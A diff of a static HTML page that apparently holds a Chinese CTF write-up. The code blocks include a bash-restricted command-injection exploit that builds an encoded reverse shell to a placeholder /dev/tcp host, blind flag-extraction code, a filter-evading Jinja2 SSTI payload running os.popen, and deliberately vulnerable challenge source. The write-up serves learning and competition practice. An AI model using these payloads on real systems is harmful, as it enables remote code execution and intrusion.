@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -288,22 +288,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]))</span>
-<span class="p">{</span>
-    <span class="nv">$test</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
-    <span class="nv">$white_list</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="s1">&#39;${#}\\(&lt;)\&#39;0&#39;</span><span class="p">);</span>
-    <span class="nv">$char_list</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
-    <span class="k">foreach</span><span class="p">(</span><span class="nv">$char_list</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">){</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$white_list</span><span class="p">)){</span>
-                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Cyzcc&#34;</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="nx">exec</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$test</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$white_list</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="s1">&#39;${#}\\(&lt;)\&#39;0&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$char_list</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$char_list</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$white_list</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Cyzcc&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>需要使用括号内的字符命令执行，参考文章<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60" target="_blank" rel="noopener">34c3 CTF minbashmaxfun writeup</a>。分析啥的官方wp简直是保姆级，太贴心了。</p>
 <p>贴一下exp</p>
@@ -362,58 +362,58 @@
 </span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="c1"># 八进制</span>
-<span class="n">n</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;${#}&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;${##}&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$((${##}&lt;&lt;${##}))&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}))&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${#}${##}))&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}${#}))&#39;</span>
-<span class="n">n</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))&#39;</span>
-
-<span class="n">f</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-
-<span class="k">def</span> <span class="nf">str_to_oct</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>                                <span class="c1">#命令转换成八进制字符串</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
-        <span class="n">o</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">t</span><span class="p">))))[</span><span class="mi">2</span><span class="p">:]</span>
-        <span class="n">s</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">o</span>   
-    <span class="k">return</span> <span class="n">s</span>
-
-<span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>                                     <span class="c1">#八进制字符串转换成字符</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$</span><span class="se">\\\&#39;</span><span class="s2">&#34;</span>                 <span class="c1">#${!#}与$0等效</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">str_to_oct</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
-        <span class="n">payload</span><span class="o">+=</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">&#34;</span>
-        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">_</span><span class="p">:</span>
-            <span class="n">payload</span><span class="o">+=</span><span class="n">n</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>
-    <span class="k">return</span> <span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span>
-
-<span class="c1"># def get_flag(url,payload):                          #盲注函数</span>
-<span class="c1">#     try:</span>
-<span class="c1">#         data = {&#39;cmd&#39;:payload}</span>
-<span class="c1">#         r = requests.post(url,data,timeout=1.5)</span>
-<span class="c1">#     except:</span>
-<span class="c1">#         return True</span>
-<span class="c1">#     return False</span>
-
-<span class="c1"># 弹shell</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">build</span><span class="p">(</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1&#39;</span><span class="p">))</span>
-
-<span class="c1">#盲注</span>
-<span class="c1">#a=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@&#39;</span>
-<span class="c1"># for i in range(1,50):</span>
-<span class="c1">#     for j in a:</span>
-<span class="c1">#         cmd=f&#39;cat /flag|grep ^{f+j}&amp;&amp;sleep 3&#39;</span>
-<span class="c1">#         url = &#34;http://ip/&#34;</span>
-<span class="c1">#         if get_flag(url,build(cmd)):</span>
-<span class="c1">#             break</span>
-<span class="c1">#     f = f+j</span>
-<span class="c1">#     print(f)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 八进制</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;${#}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;${##}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$((${##}&lt;&lt;${##}))&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}))&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${#}${##}))&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}${#}))&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">str_to_oct</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>                                <span class="c1">#命令转换成八进制字符串</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">o</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">t</span><span class="p">))))[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">o</span>   
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>                                     <span class="c1">#八进制字符串转换成字符</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$</span><span class="se">\\\&#39;</span><span class="s2">&#34;</span>                 <span class="c1">#${!#}与$0等效</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">str_to_oct</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">+=</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">_</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span><span class="o">+=</span><span class="n">n</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># def get_flag(url,payload):                          #盲注函数</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     try:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         data = {&#39;cmd&#39;:payload}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         r = requests.post(url,data,timeout=1.5)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     except:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         return True</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     return False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">build</span><span class="p">(</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#盲注</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#a=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># for i in range(1,50):</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     for j in a:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         cmd=f&#39;cat /flag|grep ^{f+j}&amp;&amp;sleep 3&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         url = &#34;http://ip/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         if get_flag(url,build(cmd)):</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#             break</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     f = f+j</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     print(f)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="normal-ssti"><a href="#normal-ssti" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:normal-ssti" class="headings">Normal SSTI</a></h2>
 <p>这题目给的有问题啊，源码开放端口错了，Dockerfile里一些文件也缺了(source文件应该没什么东西吧)。</p>
@@ -428,13 +428,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">        <span class="k">return</span> <span class="s1">&#39;&lt;h1&gt;do a real p1g&lt;/h1&gt;&#39;</span>
-<span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
-    <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
-        <span class="k">return</span> <span class="s1">&#39;&lt;h1&gt;do a real p1g&lt;/h1&gt;&#39;</span>
-<span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;&lt;h1&gt;this is your url </span><span class="si">{}</span><span class="s1">&lt;/h1&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&lt;h1&gt;do a real p1g&lt;/h1&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&lt;h1&gt;do a real p1g&lt;/h1&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;&lt;h1&gt;this is your url </span><span class="si">{}</span><span class="s1">&lt;/h1&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>有黑名单，fuzz一下，ban了较多字符，如<code>\{\{ | []</code>等等，没事，我们有控制结构，然后emmm不会了。</p>
 <p>官方payload：</p>
@@ -444,9 +444,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># __globals__|__getitem__</span>
-<span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><span class="s2">&#34;</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()</span><span class="o">%</span><span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># __globals__|__getitem__</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><span class="s2">&#34;</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()</span><span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>分析一下payload：</p>
 <p>在<a href="http://docs.jinkan.org/docs/jinja2/templates.html#id2" target="_blank" rel="noopener">官方文档</a>中描述了两种分隔符的区别：</p>
@@ -528,69 +528,69 @@
 </span><span class="lnt">62
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
-<span class="kr">const</span> <span class="nx">express_static</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-static&#39;</span><span class="p">)</span>
-<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
-<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
-
-<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
-<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">9000</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
-<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span>
-    <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span>
-<span class="p">}))</span>
-
-<span class="kd">let</span> <span class="nx">info</span> <span class="o">=</span> <span class="p">[]</span>
-
-<span class="kr">const</span> <span class="p">{</span>
-    <span class="nx">body</span><span class="p">,</span>
-    <span class="nx">validationResult</span>
-<span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-validator&#39;</span><span class="p">)</span>
-
-<span class="nx">middlewares</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="nx">body</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">).</span><span class="nx">trim</span><span class="p">(),</span>
-    <span class="nx">body</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">).</span><span class="nx">isLength</span><span class="p">({</span> <span class="nx">min</span><span class="o">:</span> <span class="mi">6</span> <span class="p">}),</span>
-<span class="p">]</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">middlewares</span><span class="p">)</span>
-
-<span class="nx">readFile</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
-	<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span>
-	<span class="k">return</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
-<span class="p">}</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span>
-    <span class="kr">const</span> <span class="nx">errors</span> <span class="o">=</span> <span class="nx">validationResult</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">errors</span><span class="p">.</span><span class="nx">isEmpty</span><span class="p">())</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">errors</span><span class="o">:</span> <span class="nx">errors</span><span class="p">.</span><span class="nx">array</span><span class="p">()</span> <span class="p">});</span>
-    <span class="p">}</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="s2">&#34;D0g3_Yes!!!&#34;</span><span class="p">){</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">info</span><span class="p">.</span><span class="nx">system_open</span> <span class="o">==</span> <span class="s2">&#34;yes&#34;</span><span class="p">){</span>
-            <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
-            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span>
-        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;The login is successful, but the system is under test and not open...&#34;</span><span class="p">)</span>
-        <span class="p">}</span>
-    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Login Fail, Password Wrong!&#34;</span><span class="p">)</span>
-    <span class="p">}</span>
-<span class="p">})</span>
-
